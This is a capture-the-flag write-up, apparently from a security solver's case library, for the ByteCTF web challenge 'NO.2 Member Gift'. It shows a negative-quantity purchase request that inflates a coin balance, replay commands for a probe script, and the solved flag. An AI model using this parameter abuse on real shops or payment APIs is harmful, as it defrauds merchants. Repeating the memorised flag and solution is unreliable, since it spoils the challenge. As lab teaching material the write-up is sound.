# CTF Case: NO.2 Member Gift

## Metadata

- Platform: ByteCTF Vulhub
- Challenge: NO.2 Member Gift
- Category: Web
- Pattern: [Payment Numeric Parameter Abuse](ctf-knowledge-web.md#payment-numeric-parameter-abuse)
- Source report: [Web1.pdf](../../../ctf/bytectf-143/reports/Web1.pdf)
- Extracted text: [Web1.skill-extracted.txt](../../../ctf/bytectf-143/reports/Web1.skill-extracted.txt)
- Solved flag: `flag{cee02333233be040074e2073692a38d042af218c1caba7883e1b0948}`

## Prompt Summary

After logging in to Tartarus, collect information. The site has a membership
system, and consuming enough money may grant a mysterious gift.

## Signal Inventory

- The site has product purchase and gift actions.
- The user state includes coins, total spending, experience, and level.
- Watching a study video grants coins and experience, but is rate limited.
- Product interaction accepts a numeric `num` parameter.
- The route hints at a reward for crossing a spending threshold.
- Verify API business `code` and message content, not only HTTP status. Some
  register or login attempts can return HTTP 200 while the business action
  failed.

## Reported Route

The report describes two routes:

1. Slow route: study to gain coins and experience, level up, then purchase
   repeatedly. This reaches level 10 but is inefficient because the study API is
   rate limited.
2. Intended route: abuse the purchase API's `num` parameter.

The key request from the report is:

```text
/api/user/interact?interact_id=3&num=-9999999&id=1
```

When total spending is already zero, a negative purchase refunds coins while
the cumulative spending floor stays at zero. With inflated coins, perform
normal positive purchases until the mysterious gift or flag is returned.

## Tool-Backed Replay Commands

Use a controlled CTF account and carry updated cookies forward:

```bash
python scripts/sec.py probe web login-probe \
  --case-dir ctf/bytectf-143/challenges/no2-member-gift \
  --path /api/user/login \
  --username <ctf-user> \
  --password <ctf-password> \
  --user-field username \
  --pass-field password \
  --json \
  --label login-no2 \
  --no-redirect

python scripts/sec.py probe web auth-confirm \
  --case-dir ctf/bytectf-143/challenges/no2-member-gift \
  --url /api/user/rating \
  --cookie-jar artifacts/login_no2-cookies.json \
  --label rating-before \
  --no-redirect \
  --save-cookies rating-before

python scripts/sec.py probe web request \
  --case-dir ctf/bytectf-143/challenges/no2-member-gift \
  --url '/api/user/interact?interact_id=3&num=-9999999&id=1' \
  --cookie-jar artifacts/rating_before-cookies.json \
  --label negative-purchase \
  --no-redirect \
  --save-cookies negative-purchase

python scripts/sec.py probe web request \
  --case-dir ctf/bytectf-143/challenges/no2-member-gift \
  --url '/api/user/interact?interact_id=3&num=9999999&id=1' \
  --cookie-jar artifacts/negative_purchase-cookies.json \
  --label positive-purchase \
  --no-redirect \
  --save-cookies positive-purchase
```

The positive purchase response contains the flag once the spending threshold is
crossed.

## Local Evidence

- Browser page evidence:
  `ctf/bytectf-143/challenges/no2-member-gift/artifacts/browser_home-browser-summary.json`
- PDF extraction:
  `ctf/bytectf-143/reports/Web1.skill-pdf-summary.json`
- Negative purchase:
  `ctf/bytectf-143/challenges/no2-member-gift/responses/solve_gift521_negative_product3.http`
- Inflated balance:
  `ctf/bytectf-143/challenges/no2-member-gift/responses/solve_gift521_rating_after_negative_product3.http`
- Flag response:
  `ctf/bytectf-143/challenges/no2-member-gift/responses/solve_gift521_positive_product3.http`

## Reusable Lesson

In CTF payment or points systems, inspect numeric parameters before grinding.
The useful bug may be a non-atomic state update: balance is refunded for a
negative purchase while cumulative spending is clamped at zero.
